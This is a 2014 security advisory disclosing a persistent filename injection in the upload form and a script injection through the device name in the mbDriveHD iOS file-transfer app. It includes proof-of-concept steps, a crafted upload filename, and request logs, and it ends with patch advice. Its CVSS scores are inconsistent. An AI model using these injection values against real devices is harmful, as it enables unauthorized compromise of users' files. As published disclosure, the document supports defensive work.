Document Title:
===============
mbDriveHD v1.0.7 iOS - Multiple Web Vulnerabilities


References (Source):
====================
http://www.vulnerability-lab.com/get_content.php?id=1198


Release Date:
=============
2014-02-14


Vulnerability Laboratory ID (VL-ID):
====================================
1198


Common Vulnerability Scoring System:
====================================
6.7


Product & Service Introduction:
===============================
mbDriveHD - Turn your iPad into a wireless network disk and document viewer. With mbDriveHD, transferring files to and
from your iPad has never been easier! Thanks to our lightning fast Web server build-in, you can use any web browser to
transfer your documents and files to/from iPad. This app has a 2.7 star rating, with ratings in 27 markets (36 ratings).
It occupies the 165441th position in our ranking with 52 points. It is among the 25% best ones of its category and among
the 25% best ones of the overall top.

( Copy of the Homepage: https://itunes.apple.com/us/app/mbdrivehd./id384867710 - Commercial $2.99 )
( Copy of the Homepage: https://itunes.apple.com/de/app/mbdrivehd-free/id399732602 - Free Edition )


Abstract Advisory Information:
==============================
The Vulnerability Laboratory Research Team discovered multiple web vulnerabilities in the official mbDriveHD v1.0.7 iOS mobile web-application.


Vulnerability Disclosure Timeline:
==================================
2014-02-14:    Public Disclosure (Vulnerability Laboratory)


Discovery Status:
=================
Published


Affected Product(s):
====================
mbpowertools
Product: mbDriveHD - iOS Mobile Web Application 1.0.7


Exploitation Technique:
=======================
Local


Severity Level:
===============
High


Technical Details & Description:
================================
1.1
A local file include web vulnerability has been discovered in the official mbDriveHD v1.0.7 iOS mobile web-application.
The local file include web vulnerability allows remote attackers to unauthorized include local file/path requests or system
specific path commands to compromise the web-application/device.

The web vulnerability is located in the `file name` value of the `Upload` module POST method request. Remote attackers are
able to inject own files with malicious filename to compromise the mobile application. The attack vector is persistent and the request
method is POST. The local file/path include execution occcurs in the main file index section after the POST method request. The security
risk of the local file include web vulnerability is estimated as high(+) with a cvss (common vulnerability scoring system) count of 7.1(+)|(-)7.2.

Exploitation of the local file include web vulnerability requires no user interaction or privileged web-application user account with password.
Successful exploitation of the local web vulnerability results in mobile application or connected device component compromise by unauthorized
local file include web attacks.

Request Method(s):
				[+] [POST]

Vulnerable Input(s):
				[+] Upload

Vulnerable Parameter(s):
				[+] filename

Affected Module(s):
				[+] Index File Directory Listing



1.2
A local command/path injection web vulnerability has been discovered in the official mbDriveHD v1.0.7 iOS mobile web-application.
The remote vulnerability allows to inject local commands via vulnerable system values to compromise the apple iOS mobile application.

The vulnerability is located in the in the `device name` value of the `index and sub category listing` module. Local attackers are
able to inject own script codes as iOS device name. The execute of the injected script code occurs with persistent attack vector
in the header section of the web interface. The security risk of the command/path inject vulnerabilities are estimated as high
with a cvss (common vulnerability scoring system) count of 6.0(+)|(-)6.1.

Exploitation of the command/path inject vulnerability requires a local low privileged iOS device account with restricted access
and no direct user interaction. Successful exploitation of the vulnerability results in unauthorized execute of system specific
commands or unauthorized path requests.

Request Method(s):
				[+] [GET]

Vulnerable Parameter(s):
				[+] devicename

Affected Module(s):
				[+] Index File Directory Listing - [Header]


Proof of Concept (PoC):
=======================
1.1
The local file include web vulnerability can be exploited by remote attackers without user interaction or privileged mobile
web-application user account. For security demonstration or to reproduce the vulnerability follow the provided information and steps below.

PoC:  Upload > [filename]

<p><a href="..">..</a><br>
<table width="750"><tbody>
<tr>
<td width="500"><a href="><%2F./[LOCAL FILE INCLUDE VULNERABILITY!].jpg">><><%2F./[LOCAL FILE INCLUDE VULNERABILITY!].jpg">.jpg</a></td>
<td align="right" width="140" >    23.8 Kb</td><td width="10"></td><td width="300">2014-02-12 13:49:43 +0000</td>
</tr><tr>
<td width="500" ><a href="><%2F./[LOCAL FILE INCLUDE VULNERABILITY!].jpg">><%2F./[LOCAL FILE INCLUDE VULNERABILITY!].jpg</a></td>
<td align="right" width="140" >    23.8 Kb</td><td width="10"></td><td width="300">2014-02-12 13:32:23 +0000</td>
</tr></tbody></table>
</p><form action="" method="post" enctype="multipart/form-data" name="form1" id="form1">
<label>upload file:<input type="file" name="file" id="file" /></label><label><input type="submit" name="button" id="button" value="Submit" /></label></form>
</body></html></iframe></a></td></tr></tbody></table></p>



--- PoC Session Logs [POST] ---
Status: 200[OK]
POST http://localhost:8080/ Load Flags[LOAD_DOCUMENT_URI  LOAD_INITIAL_DOCUMENT_URI  ] Gr��e des Inhalts[1228] Mime Type[application/x-unknown-content-type]
   Request Header:
      Host[localhost:8080]
      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0]
      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
      Accept-Language[de-de,de;q=0.8,en-us;q=0.5,en;q=0.3]
      Accept-Encoding[gzip, deflate]
      Referer[http://192.168.2.109:8080/]
      Cookie[jtable%2376270709page-size=10]
      Connection[keep-alive]
   POST-Daten:
      POST_DATA[-----------------------------27573282698270
Content-Disposition: form-data; name="file"; filename="<%2F./[LOCAL FILE INCLUDE VULNERABILITY!].jpg"
Content-Type: image/jpeg



1.2
The local command inject web vulnerability can be exploited by remote attackers with physical device access and without
user interaction. For security demonstration or to reproduce the vulnerability follow the provided information and steps below.

1. Install the mobile web application and start it
2. Open your device settings info menu and change the `device name` to your own command/path string combined with script code
3. Save the device name and open the software
4. Activate the wifi interface port 8080

PoC: Device Name - Command Inject Vulnerability

<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Files from bkm337�</title><style>html {background-color:#eeeeee} body
{ background-color:#FFFFFF; font-family:Tahoma,Arial,Helvetica,sans-serif; font-size:18x;
margin-left:15%; margin-right:15%; border:3px groove #006600; padding:15px; } </style></head>
<body><h1>Files from bkm337�[LOCAL COMMAND INJECT VIA DEVICE NAME VALUE!]</h1><bq>The following files are hosted live
from the iPad's Docs folder.</bq><p><a href="..">..</a><br><table width="750"><tbody><tr>
<td width="500"><a href="37.jpg">37.jpg</a></td>
<td align="right" width="140">23.8 Kb</td><td width="10"></td><td width="300">2014-02-12 13:32:23 +0000</td>
</tr></tbody></table>
</p><form action="" method="post" enctype="multipart/form-data" name="form1" id="form1">
<label>upload file:<input name="file" id="file" type="file"></label><label>
<input name="button" id="button" value="Submit" type="submit"></label></form></body></html>





Solution - Fix & Patch:
=======================
1.1
The file include web vulnerability can be patched by a secure parse of the filename value in the vulnerable upload POST method request.
Ensure also the output name and data information context is secure encoded to prevent persistent injects or command executions.

1.2
The local command inject web vulnerability can be patched by a secure encode of the vulnerable device name value in the header location of the web-interface.


Security Risk:
==============
1.1
The security risk of the local file include web vulnerability is estimated as high(+).

1.2
the security risk of the local command inject web vulnerability is estimated as medium(+)|(-)high.


Credits & Authors:
==================
Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (bkm@evolution-sec.com) [www.vulnerability-lab.com]


Disclaimer & Information:
=========================
The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties,
either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-
Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business
profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some
states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation
may not apply. We do not approve or encourage anybody to break any vendor licenses, policies, deface websites, hack into databases
or trade with fraud/stolen material.

Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       - www.evolution-sec.com
Contact:    admin@vulnerability-lab.com 	- research@vulnerability-lab.com 	       - admin@evolution-sec.com
Section:    www.vulnerability-lab.com/dev 	- forum.vulnerability-db.com 		       - magazine.vulnerability-db.com
Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       - youtube.com/user/vulnerability0lab
Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   - vulnerability-lab.com/rss/rss_news.php

Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory.
Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other
media, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and
other information on this website is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed),
modify, use or edit our material contact (admin@vulnerability-lab.com or research@vulnerability-lab.com) to get a permission.

				Copyright � 2014 | Vulnerability Laboratory [Evolution Security]



--
VULNERABILITY LABORATORY RESEARCH TEAM
DOMAIN: www.vulnerability-lab.com
CONTACT: research@vulnerability-lab.com